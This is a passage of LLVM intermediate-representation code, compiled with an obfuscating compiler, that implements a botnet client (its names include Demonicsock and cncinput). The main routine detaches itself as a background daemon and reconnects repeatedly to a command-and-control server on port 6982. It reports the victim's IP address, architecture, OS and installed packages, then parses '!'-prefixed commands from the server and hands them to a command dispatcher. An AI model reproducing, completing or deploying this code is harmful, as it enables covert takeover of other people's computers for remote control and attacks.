declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @Demonicsock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @Demonicsock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @Demonicsock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Demonserv, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #6
  store i32 6982, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %37, i32* @Demonicsock, align 4
  %38 = load i32, i32* @Demonicsock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [10 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @getpid() #6
  %24 = xor i32 %22, %23
  call void @srand(i32 %24) #6
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = call i32 @getpid() #6
  %27 = xor i32 %25, %26
  call void @init_rand(i32 %27)
  %28 = call i32 @getOurIP()
  %29 = call i32 @fork() #6
  store i32 %29, i32* %6, align 4
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %2
  %32 = load i32, i32* %6, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %8, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:34:                                     ; preds = %2
  %35 = load i32, i32* %6, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %48, label %37

; <label>:37:                                     ; preds = %34
  %38 = call i32 @fork() #6
  store i32 %38, i32* %7, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  call void @exit(i32 0) #12
  unreachable

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %45, label %44

; <label>:44:                                     ; preds = %41
  br label %46

; <label>:45:                                     ; preds = %41
  br label %46

; <label>:46:                                     ; preds = %45, %44
  br label %47

; <label>:47:                                     ; preds = %46
  br label %49

; <label>:48:                                     ; preds = %34
  br label %49

; <label>:49:                                     ; preds = %48, %47
  br label %50

; <label>:50:                                     ; preds = %49
  %51 = call i32 @setsid() #6
  %52 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0)) #6
  %53 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  br label %54

; <label>:54:                                     ; preds = %310, %57, %50
  %55 = call i32 @initConnection()
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %59

; <label>:57:                                     ; preds = %54
  %58 = call i32 @sleep(i32 5)
  br label %54

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @Demonicsock, align 4
  %61 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %62 = call i8* @inet_ntoa(i32 %61) #6
  %63 = call i8* @defarchs()
  %64 = call i8* @defopsys()
  %65 = call i8* @defpkgs()
  %66 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([180 x i8], [180 x i8]* @.str.34, i32 0, i32 0), i8* %62, i8* %63, i8* %64, i8* %65)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %67

; <label>:67:                                     ; preds = %309, %180, %59
  %68 = load i32, i32* @Demonicsock, align 4
  %69 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %70 = call i32 @recvLine(i32 %68, i8* %69, i32 4096)
  store i32 %70, i32* %10, align 4
  %71 = icmp ne i32 %70, -1
  br i1 %71, label %72, label %310

; <label>:72:                                     ; preds = %67
  store i32 0, i32* %11, align 4
  br label %73

; <label>:73:                                     ; preds = %144, %72
  %74 = load i32, i32* %11, align 4
  %75 = sext i32 %74 to i64
  %76 = load i64, i64* @numpids, align 8
  %77 = icmp ult i64 %75, %76
  br i1 %77, label %78, label %147

; <label>:78:                                     ; preds = %73
  %79 = load i32*, i32** @pids, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i32, i32* %79, i64 %81
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @waitpid(i32 %83, i32* null, i32 1)
  %85 = icmp sgt i32 %84, 0
  br i1 %85, label %86, label %143

; <label>:86:                                     ; preds = %78
  %87 = load i32, i32* %11, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  br label %89

; <label>:89:                                     ; preds = %105, %86
  %90 = load i32, i32* %13, align 4
  %91 = zext i32 %90 to i64
  %92 = load i64, i64* @numpids, align 8
  %93 = icmp ult i64 %91, %92
  br i1 %93, label %94, label %108

; <label>:94:                                     ; preds = %89
  %95 = load i32*, i32** @pids, align 8
  %96 = load i32, i32* %13, align 4
  %97 = zext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  %99 = load i32, i32* %98, align 4
  %100 = load i32*, i32** @pids, align 8
  %101 = load i32, i32* %13, align 4
  %102 = sub i32 %101, 1
  %103 = zext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %100, i64 %103
  store i32 %99, i32* %104, align 4
  br label %105

; <label>:105:                                    ; preds = %94
  %106 = load i32, i32* %13, align 4
  %107 = add i32 %106, 1
  store i32 %107, i32* %13, align 4
  br label %89

; <label>:108:                                    ; preds = %89
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %13, align 4
  %111 = sub i32 %110, 1
  %112 = zext i32 %111 to i64
  %113 = getelementptr inbounds i32, i32* %109, i64 %112
  store i32 0, i32* %113, align 4
  %114 = load i64, i64* @numpids, align 8
  %115 = add i64 %114, -1
  store i64 %115, i64* @numpids, align 8
  %116 = load i64, i64* @numpids, align 8
  %117 = add i64 %116, 1
  %118 = mul i64 %117, 4
  %119 = call noalias i8* @malloc(i64 %118) #6
  %120 = bitcast i8* %119 to i32*
  store i32* %120, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %121

; <label>:121:                                    ; preds = %136, %108
  %122 = load i32, i32* %13, align 4
  %123 = zext i32 %122 to i64
  %124 = load i64, i64* @numpids, align 8
  %125 = icmp ult i64 %123, %124
  br i1 %125, label %126, label %139

; <label>:126:                                    ; preds = %121
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %13, align 4
  %129 = zext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %127, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = load i32*, i32** %12, align 8
  %133 = load i32, i32* %13, align 4
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  store i32 %131, i32* %135, align 4
  br label %136

; <label>:136:                                    ; preds = %126
  %137 = load i32, i32* %13, align 4
  %138 = add i32 %137, 1
  store i32 %138, i32* %13, align 4
  br label %121

; <label>:139:                                    ; preds = %121
  %140 = load i32*, i32** @pids, align 8
  %141 = bitcast i32* %140 to i8*
  call void @free(i8* %141) #6
  %142 = load i32*, i32** %12, align 8
  store i32* %142, i32** @pids, align 8
  br label %143

; <label>:143:                                    ; preds = %139, %78
  br label %144

; <label>:144:                                    ; preds = %143
  %145 = load i32, i32* %11, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %11, align 4
  br label %73

; <label>:147:                                    ; preds = %73
  %148 = load i32, i32* %10, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %149
  store i8 0, i8* %150, align 1
  %151 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %151)
  %152 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %152, i8** %14, align 8
  %153 = load i8*, i8** %14, align 8
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 33
  br i1 %156, label %157, label %309

; <label>:157:                                    ; preds = %147
  %158 = load i8*, i8** %14, align 8
  %159 = getelementptr inbounds i8, i8* %158, i64 1
  store i8* %159, i8** %15, align 8
  br label %160

; <label>:160:                                    ; preds = %172, %157
  %161 = load i8*, i8** %15, align 8
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp ne i32 %163, 32
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %15, align 8
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp ne i32 %168, 0
  br label %170

; <label>:170:                                    ; preds = %165, %160
  %171 = phi i1 [ false, %160 ], [ %169, %165 ]
  br i1 %171, label %172, label %175

; <label>:172:                                    ; preds = %170
  %173 = load i8*, i8** %15, align 8
  %174 = getelementptr inbounds i8, i8* %173, i32 1
  store i8* %174, i8** %15, align 8
  br label %160

; <label>:175:                                    ; preds = %170
  %176 = load i8*, i8** %15, align 8
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %180, label %181

; <label>:180:                                    ; preds = %175
  br label %67

; <label>:181:                                    ; preds = %175
  %182 = load i8*, i8** %15, align 8
  store i8 0, i8* %182, align 1
  %183 = load i8*, i8** %14, align 8
  %184 = getelementptr inbounds i8, i8* %183, i64 1
  store i8* %184, i8** %15, align 8
  %185 = load i8*, i8** %14, align 8
  %186 = load i8*, i8** %15, align 8
  %187 = call i64 @strlen(i8* %186) #10
  %188 = getelementptr inbounds i8, i8* %185, i64 %187
  %189 = getelementptr inbounds i8, i8* %188, i64 2
  store i8* %189, i8** %14, align 8
  br label %190

; <label>:190:                                    ; preds = %210, %181
  %191 = load i8*, i8** %14, align 8
  %192 = load i8*, i8** %14, align 8
  %193 = call i64 @strlen(i8* %192) #10
  %194 = sub i64 %193, 1
  %195 = getelementptr inbounds i8, i8* %191, i64 %194
  %196 = load i8, i8* %195, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 10
  br i1 %198, label %208, label %199

; <label>:199:                                    ; preds = %190
  %200 = load i8*, i8** %14, align 8
  %201 = load i8*, i8** %14, align 8
  %202 = call i64 @strlen(i8* %201) #10
  %203 = sub i64 %202, 1
  %204 = getelementptr inbounds i8, i8* %200, i64 %203
  %205 = load i8, i8* %204, align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 13
  br label %208

; <label>:208:                                    ; preds = %199, %190
  %209 = phi i1 [ true, %190 ], [ %207, %199 ]
  br i1 %209, label %210, label %216

; <label>:210:                                    ; preds = %208
  %211 = load i8*, i8** %14, align 8
  %212 = load i8*, i8** %14, align 8
  %213 = call i64 @strlen(i8* %212) #10
  %214 = sub i64 %213, 1
  %215 = getelementptr inbounds i8, i8* %211, i64 %214
  store i8 0, i8* %215, align 1
  br label %190

; <label>:216:                                    ; preds = %208
  %217 = load i8*, i8** %14, align 8
  store i8* %217, i8** %16, align 8
  br label %218

; <label>:218:                                    ; preds = %230, %216
  %219 = load i8*, i8** %14, align 8
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp ne i32 %221, 32
  br i1 %222, label %223, label %228

; <label>:223:                                    ; preds = %218
  %224 = load i8*, i8** %14, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp ne i32 %226, 0
  br label %228

; <label>:228:                                    ; preds = %223, %218
  %229 = phi i1 [ false, %218 ], [ %227, %223 ]
  br i1 %229, label %230, label %233

; <label>:230:                                    ; preds = %228
  %231 = load i8*, i8** %14, align 8
  %232 = getelementptr inbounds i8, i8* %231, i32 1
  store i8* %232, i8** %14, align 8
  br label %218

; <label>:233:                                    ; preds = %228
  %234 = load i8*, i8** %14, align 8
  store i8 0, i8* %234, align 1
  %235 = load i8*, i8** %14, align 8
  %236 = getelementptr inbounds i8, i8* %235, i32 1
  store i8* %236, i8** %14, align 8
  %237 = load i8*, i8** %16, align 8
  store i8* %237, i8** %17, align 8
  br label %238

; <label>:238:                                    ; preds = %242, %233
  %239 = load i8*, i8** %17, align 8
  %240 = load i8, i8* %239, align 1
  %241 = icmp ne i8 %240, 0
  br i1 %241, label %242, label %251

; <label>:242:                                    ; preds = %238
  %243 = load i8*, i8** %17, align 8
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = call i32 @toupper(i32 %245) #10
  %247 = trunc i32 %246 to i8
  %248 = load i8*, i8** %17, align 8
  store i8 %247, i8* %248, align 1
  %249 = load i8*, i8** %17, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %17, align 8
  br label %238

; <label>:251:                                    ; preds = %238
  store i32 1, i32* %19, align 4
  %252 = load i8*, i8** %14, align 8
  %253 = call i8* @strtok(i8* %252, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %253, i8** %20, align 8
  %254 = load i8*, i8** %16, align 8
  %255 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  store i8* %254, i8** %255, align 16
  br label %256

; <label>:256:                                    ; preds = %287, %251
  %257 = load i8*, i8** %20, align 8
  %258 = icmp ne i8* %257, null
  br i1 %258, label %259, label %289

; <label>:259:                                    ; preds = %256
  %260 = load i8*, i8** %20, align 8
  %261 = load i8, i8* %260, align 1
  %262 = zext i8 %261 to i32
  %263 = icmp ne i32 %262, 10
  br i1 %263, label %264, label %287

; <label>:264:                                    ; preds = %259
  %265 = load i8*, i8** %20, align 8
  %266 = call i64 @strlen(i8* %265) #10
  %267 = add i64 %266, 1
  %268 = call noalias i8* @malloc(i64 %267) #6
  %269 = load i32, i32* %19, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %270
  store i8* %268, i8** %271, align 8
  %272 = load i32, i32* %19, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %273
  %275 = load i8*, i8** %274, align 8
  %276 = load i8*, i8** %20, align 8
  %277 = call i64 @strlen(i8* %276) #10
  %278 = add i64 %277, 1
  call void @llvm.memset.p0i8.i64(i8* %275, i8 0, i64 %278, i32 1, i1 false)
  %279 = load i32, i32* %19, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %280
  %282 = load i8*, i8** %281, align 8
  %283 = load i8*, i8** %20, align 8
  %284 = call i8* @strcpy(i8* %282, i8* %283) #6
  %285 = load i32, i32* %19, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %19, align 4
  br label %287

; <label>:287:                                    ; preds = %264, %259
  %288 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %288, i8** %20, align 8
  br label %256

; <label>:289:                                    ; preds = %256
  %290 = load i32, i32* %19, align 4
  %291 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i32 0, i32 0
  call void @cncinput(i32 %290, i8** %291)
  %292 = load i32, i32* %19, align 4
  %293 = icmp sgt i32 %292, 1
  br i1 %293, label %294, label %308

; <label>:294:                                    ; preds = %289
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  br label %295

; <label>:295:                                    ; preds = %304, %294
  %296 = load i32, i32* %21, align 4
  %297 = load i32, i32* %19, align 4
  %298 = icmp slt i32 %296, %297
  br i1 %298, label %299, label %307

; <label>:299:                                    ; preds = %295
  %300 = load i32, i32* %21, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %301
  %303 = load i8*, i8** %302, align 8
  call void @free(i8* %303) #6
  br label %304

; <label>:304:                                    ; preds = %299
  %305 = load i32, i32* %21, align 4
  %306 = add nsw i32 %305, 1
  store i32 %306, i32* %21, align 4
  br label %295

; <label>:307:                                    ; preds = %295
  br label %308

; <label>:308:                                    ; preds = %307, %289
  br label %309

; <label>:309:                                    ; preds = %308, %147
  br label %67

; <label>:310:                                    ; preds = %67
  br label %54
                                                  ; No predecessors!
  %312 = load i32, i32* %3, align 4
  ret i32 %312
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #2

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146658232}
!2 = !{i32 -2146657541}
!3 = !{i32 -2146656792}
